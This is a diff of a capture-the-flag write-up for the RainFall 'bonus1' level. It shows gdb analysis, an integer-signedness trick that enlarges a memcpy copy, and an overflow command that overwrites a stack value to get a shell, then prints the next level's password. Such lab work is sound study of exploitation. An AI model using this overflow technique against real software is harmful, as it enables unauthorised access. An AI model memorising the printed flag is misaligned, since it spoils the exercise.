@@ -1,6 +1,45 @@
-If atoi(argv[1]) > 9 the program doesn't run
-   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
-Call to memcpy we can try to overflow
-   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+# we should have atoi(argv[1]) <= 9, otherwise the program doesn't run
+0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
 
+# we have to make the value of the result of the atoi function equal to 0x574f4c46 (1464814662)
+# we can try to overflow the memcpy function
+0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+# maximum number of characters we can copy is 36 = 4 * 9
+# let's try to find an offset for the overflow
+r 9 AAA%AAsAABAA$AAnAACAA-AAAAADAA;AAAAAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+# but there is no segfault
+# So to copy more than 36 characters, we try negative numbers
+# A negative number is less than 9 and is converted to size_t with memcpy
+# So we take the max of unsigned int and devide it by 4, then add 1.
+# 4294967295 / 4 = 1073741823 + 1 = 1073741824
+# and try again :
+b *main+79
+run -1073741824 toto
+gdb-peda$ x/x $esp+8
+0xbffff288: 0x00000000
+# very interresting, because $esp + 8 is the 3rd parameter of the memecpy
+# function = 4 * atoi(argv[1])
+# if we want that 4 * atoi(argv[1]) = 100, we have to substract 25 from argv[1]
+# and try again
+run -1073741799 toto
+x/d $esp+8
+0xbffff288: 100
+# now let's run with a pattern
+r -1073741799 AAA%AAsAABAA$AAnAACAA-AAAAADAA;AAAAAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+# offset
+40
+# so we can rewrote $esp + 0x3c and make it equal to 0x574f4c46
+# and we have to adjust our argv[1] value to make it equal to 40 (offset) + 4 (value)
+# after beeing converted to size_t
+# we have to substract 44 / 4 = 11 from -1073741824
+# result = -1073741813
+# and try again :
+
+bonus1@RainFall:~$ ./bonus1 -1073741813 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ exit
